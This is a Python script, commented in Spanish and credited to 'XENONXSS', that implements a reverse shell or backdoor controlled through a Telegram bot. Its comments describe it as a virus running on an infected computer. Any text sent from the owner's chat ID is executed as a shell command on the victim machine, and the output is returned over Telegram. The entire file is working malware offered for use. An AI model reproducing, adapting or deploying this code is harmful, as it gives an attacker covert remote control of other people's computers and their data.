# POWERED BY XENONXSS TO @DEVREVENGERS
# COMENTADO POR XENONXSS
# ReverseShell ft. Telegram API

from telegram.ext import * 
import subprocess
import os

# BOT API.
API_KEY = 'set the api key'
# ID del dueño
admin_id = 'set the id'

# Ubicación del virus en el equipo infectado.
CURR_DIR = os.path.dirname(os.path.realpath(__file__))

def ejecutar(comando):

    # Cualquier comando viene acompañado de un "cd", para saber donde esta la shell.
    comando = "cd " + CURR_DIR + " | " + comando

    # Result es el output del comando que enviemos.
    result = subprocess.check_output(comando, shell=True)
    return result

def sample_responses(input_text, id):

    # Si la ID del usuario corresponde a la mía/nuestra, el bot le hará caso.
    if id == admin_id:
        user_message = str(input_text).lower()

        if user_message == ("status"):
            return "Estoy operativo! me encuentro en: " + CURR_DIR
        else:
            try:
                return ejecutar(user_message)
            except:
                return "Error en la sentencia :("
    elif input_text == "id":
        return get_userid
    else:
        return "This is a private service :("

def handle_message(update, context):
    # Mensaje recibido
    global text
    global get_userid

    get_userid = str(update.message.chat.id).lower()
    text = str(update.message.text).lower()
    response = str(sample_responses(text, get_userid))
    update.message.reply_text(response)
        
def error(update, context): 
    userid = str(update.message.chat.id).lower()
    sample_responses(text, userid)
   
def main():
    updater = Updater(API_KEY, use_context=True)
    dp = updater.dispatcher
    dp.add_handler(MessageHandler(Filters.text, handle_message))
    dp.add_error_handler(error)
    updater.start_polling()
    updater.idle()
main()
